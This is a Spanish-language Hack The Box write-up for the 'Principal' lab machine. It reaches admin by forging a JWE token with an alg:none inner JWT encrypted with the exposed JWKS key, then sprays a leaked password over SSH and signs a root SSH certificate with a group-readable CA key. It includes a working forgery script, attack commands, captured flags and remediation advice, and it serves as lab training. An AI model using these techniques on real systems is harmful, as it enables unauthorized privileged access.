# HTB Machine Report — Principal

**Date:** 2026-05-26
**Author:** Franksimon
**Platform:** Hack The Box
**Difficulty:** EASY
**OS:** Linux (Ubuntu 24.04.4 LTS)
**IP:** 10.129.244.220
**Status:** Pwned

---

## 1. Executive Summary

Principal es una máquina Linux que expone una aplicación web Java (Jetty + pac4j) con autenticación mediante tokens JWE/JWT. El endpoint JWKS expone la clave pública RSA del servidor, permitiendo forjar tokens JWE con privilegios ROLE_ADMIN sin conocer la clave privada. Con acceso admin se extrae una credencial en texto claro desde `/api/settings`, lo que permite acceso SSH como `svc-deploy`. La escalación a root se logra leyendo la llave privada de una CA SSH a la que el usuario tiene acceso por su grupo, firmando un certificado propio con `principal=root`.

**Cadena de ataque:**
```
JWE forgery (JWKS público) → ROLE_ADMIN → credencial en settings → SSH svc-deploy → CA SSH privkey → cert root → root
```

---

## 2. Enumeration

### 2.1 Port Scan

```bash
sudo nmap -sS -sV -O -p- -Pn 10.129.244.220
```

| Port     | State | Service | Version              |
|----------|-------|---------|----------------------|
| 22/tcp   | open  | SSH     | OpenSSH 9.6p1 Ubuntu |
| 8080/tcp | open  | HTTP    | Jetty                |

- TTL → Linux
- Header `X-Powered-By: pac4j-jwt/6.0.3` en todas las respuestas HTTP
- Redirige a `/login` con código 302

### 2.2 Reconocimiento Web — Puerto 8080

**Principal Internal Platform v1.2.0 — Powered by pac4j**

Login page con campos Username/Password. Features anunciadas:

- Deployment Management (SSH certificate authentication)
- Access Control (JWT-encrypted authentication)
- Real-time Monitoring (Prometheus)

![Login page](screenshots/login.png)

![Wappalyzer](screenshots/wappalyzer.png)

**Wappalyzer:** Jetty + Java

### 2.3 Enumeración de Directorios

```bash
gobuster dir -u http://10.129.244.220:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -b 404,302
```

| Path                              | Status | Relevancia                       |
|-----------------------------------|--------|----------------------------------|
| `/dashboard`                      | 200    | HTML del dashboard (JS redirect) |
| `/api/experiments`                | 401    | Falso positivo                   |
| `/login`                          | 200    | Login page                       |
| `/reset-password`                 | 501    | "Not Implemented"                |

### 2.4 Análisis de app.js

`GET /static/js/app.js` revela la arquitectura completa del sistema de autenticación:

```
Authentication flow:
1. POST /api/auth/login → servidor devuelve token JWE
2. Token: JWE cifrado con RSA-OAEP-256 + A128GCM
3. Inner JWT firmado con RS256
4. Claims: sub, role (ROLE_ADMIN|ROLE_MANAGER|ROLE_USER), iss, iat, exp
5. Clave pública en /api/auth/jwks
```

Endpoints identificados: `/api/dashboard`, `/api/users`, `/api/settings`.

### 2.5 JWKS — Clave Pública Expuesta

```bash
curl -s http://10.129.244.220:8080/api/auth/jwks
```

```json
{
  "keys": [{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "enc-key-1",
    "n": "lTh54vtBS1NAWrxAFU1NEZdr..."
  }]
}
```

`kid: "enc-key-1"` — clave de **cifrado** JWE. Al ser pública y expuesta, cualquiera puede usarla para crear tokens cifrados válidos.

![JWKS en Burp](screenshots/jwks_burp.png)

---

## 3. Vulnerability Identification

| # | Vulnerabilidad | CVE | CVSS | Ubicación |
|---|---------------|-----|------|-----------|
| 1 | JWE Forgery via exposed public key | — | 9.1 | `/api/auth/jwks` |
| 2 | Credencial en texto claro en API | — | 8.5 | `/api/settings` |
| 3 | CA SSH privkey legible por grupo | — | 9.0 | `/opt/principal/ssh/ca` |
| 4 | Inner JWT sin verificación de firma | — | 8.0 | pac4j config |

### JWE Forgery — Concepto

**JWS (signing):** Se firma con llave privada, se verifica con pública → necesitas la privada para forjar.

**JWE (encryption):** Se **cifra con la llave pública**, se descifra con la privada → **cualquiera con la pública puede crear tokens cifrados válidos**.

El servidor expone su llave pública en JWKS. Combinado con un inner JWT sin verificación de firma (`alg: none`), permite crear tokens admin desde cero sin credenciales.

---

## 4. Exploitation

### 4.1 JWE Token Forgery — ROLE_ADMIN

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install joserfc requests
```

Script `forge_token.py`:

```python
#!/usr/bin/env python3
import json, time, base64, requests
from joserfc import jwe
from joserfc.jwk import RSAKey

TARGET = "http://10.129.244.220:8080"

jwks = requests.get(f"{TARGET}/api/auth/jwks").json()
pub_key = RSAKey.import_key(jwks["keys"][0])

def b64url(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

now = int(time.time())
inner = (
    f"{b64url({'alg': 'none', 'typ': 'JWT'})}"
    f".{b64url({'sub': 'admin', 'role': 'ROLE_ADMIN', 'iss': 'principal-platform', 'iat': now, 'exp': now + 3600})}"
    f"."
)

token = jwe.encrypt_compact(
    {"alg": "RSA-OAEP-256", "enc": "A128GCM", "cty": "JWT", "kid": "enc-key-1"},
    inner.encode(),
    pub_key,
    algorithms=["RSA-OAEP-256", "A128GCM"]
)
```

**Desglose del ataque:**

1. Se obtiene la clave pública RSA del servidor vía JWKS
2. Se construye un inner JWT con `alg: none` (sin firma) y claims `ROLE_ADMIN`
3. Se cifra como JWE usando la clave pública del servidor (RSA-OAEP-256 + A128GCM)
4. El servidor descifra el JWE con su clave privada, lee los claims y confía en ellos sin verificar la firma interna

**Resultado:** `HTTP 200` en `/api/dashboard` con sesión como `admin (ROLE_ADMIN)`

### 4.2 Extracción de Credencial desde /api/settings

Con el token admin forjado:

```bash
curl -s http://10.129.244.220:8080/api/settings \
  -H "Authorization: Bearer <TOKEN>"
```

Respuesta crítica:

```json
{
  "security": {
    "encryptionKey": "D3pl0y_$$H_Now42!"
  },
  "infrastructure": {
    "sshCertAuth": "enabled",
    "sshCaPath": "/opt/principal/ssh/"
  }
}
```

### 4.3 Password Spray con crackmapexec

Usuarios extraídos de `/api/users`: admin, svc-deploy, jthompson, amorales, bwright, kkumar, mwilson, lzhang.

```bash
crackmapexec ssh 10.129.244.220 -u users.txt -p 'D3pl0y_$$H_Now42!'
```

```
[+] svc-deploy:D3pl0y_$$H_Now42! - shell access!
```

```bash
ssh svc-deploy@10.129.244.220
# Password: D3pl0y_$$H_Now42!
```

![crackmapexec spray](screenshots/crackmapexec.png)

---

## 5. Post-Exploitation

### 5.1 User Flag

```bash
cat ~/user.txt
```

**User flag:** `37de8716f36f10392a8a8c744f69c8ba`

![User flag](screenshots/user_flag.png)

---

## 6. Privilege Escalation — SSH CA Certificate Forgery

### 6.1 Enumeración de Privilegios

```bash
id
# uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)

sudo -l
# Sorry, user svc-deploy may not run sudo on principal.
```

Grupo `deployers` — vector a investigar.

### 6.2 SSH CA Accesible por Grupo

```bash
ls -la /opt/principal/ssh/
```

```
drwxr-x--- root deployers   .
-rw-r----- root deployers   README.txt
-rw-r----- root deployers   ca          ← llave privada CA (legible por deployers)
-rw-r--r-- root root        ca.pub
```

`svc-deploy` es miembro de `deployers` → puede leer `/opt/principal/ssh/ca`.

```bash
cat /opt/principal/ssh/README.txt
# CA keypair for SSH certificate automation.
# This CA is trusted by sshd for certificate-based authentication.
# Algorithm: RSA 4096-bit
```

### 6.3 Forjado de Certificado SSH con principal=root

En la máquina atacante:

```bash
# Guardar la CA privada
cat > /tmp/ca << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
[clave privada de la CA]
-----END OPENSSH PRIVATE KEY-----
EOF
chmod 600 /tmp/ca

# Generar nuevo keypair del atacante
ssh-keygen -t rsa -f /tmp/attacker_key -N ""

# Firmar la clave pública con la CA — principal root
ssh-keygen -s /tmp/ca -I "pwned" -n "root" -V +1h /tmp/attacker_key.pub
# Signed user key /tmp/attacker_key-cert.pub: id "pwned" serial 0 for root valid 1h

# SSH como root con el certificado
ssh -i /tmp/attacker_key root@10.129.244.220
```

**Concepto:** La flag `-n "root"` define el **principal** del certificado — los usernames bajo los que es válido. El servidor SSH confía en cualquier certificado firmado por la CA configurada. Al firmar con la llave privada de la CA y especificar `root`, el servidor acepta la conexión como root sin contraseña.

---

## 7. Root Flag

```bash
cat /root/root.txt
```

**Root flag:** `e8387f20fcd6adcb84138262ee4e6fcc`

---

## 8. Remediation

| Finding | Recomendación | Prioridad |
|---------|--------------|-----------|
| JWKS expone clave pública JWE | Separar claves de firma y cifrado; no exponer la clave de cifrado | Critical |
| Inner JWT sin verificación de firma | Configurar `JwtAuthenticator` con signing key | Critical |
| Credencial en texto claro en `/api/settings` | Usar gestor de secretos (Vault) | Critical |
| CA SSH privkey legible por grupo | Permisos `root:root 600`; usar HSM o Vault | High |
| Password reutilizada en cuenta de servicio | Política de contraseñas únicas; rotar tras incidente | High |

---

## 9. Lessons Learned

- **JWE ≠ JWS:** JWE cifra con la clave pública → exponer el JWKS permite forjar tokens admin sin la clave privada.
- `app.js` reveló toda la arquitectura de autenticación — siempre analizar el JS del frontend antes de atacar.
- Los endpoints admin de APIs internas frecuentemente filtran secretos — `/api/settings` expuso credenciales en texto claro.
- El grupo del sistema operativo (`deployers`) fue el puente hacia el vector de privesc — `id` es esencial en post-explotación.
- **SSH certificate forgery:** Si tienes la CA privkey, puedes autenticarte como cualquier usuario. Checklist:

```bash
find / -name "ca" -o -name "ca_key" 2>/dev/null | grep -i ssh
grep -r "TrustedUserCAKeys" /etc/ssh/
# Si hay CA accesible → ssh-keygen -s ca -I x -n root -V +1h key.pub
```

---

## 10. References

- [pac4j JWT/JWE documentation](https://www.pac4j.org/docs/authenticators/jwt.html)
- RFC 7516 — JSON Web Encryption (JWE)
- [SSH Certificate Authority](https://www.ssh.com/academy/ssh/certificate)
- HTB Machine: Principal
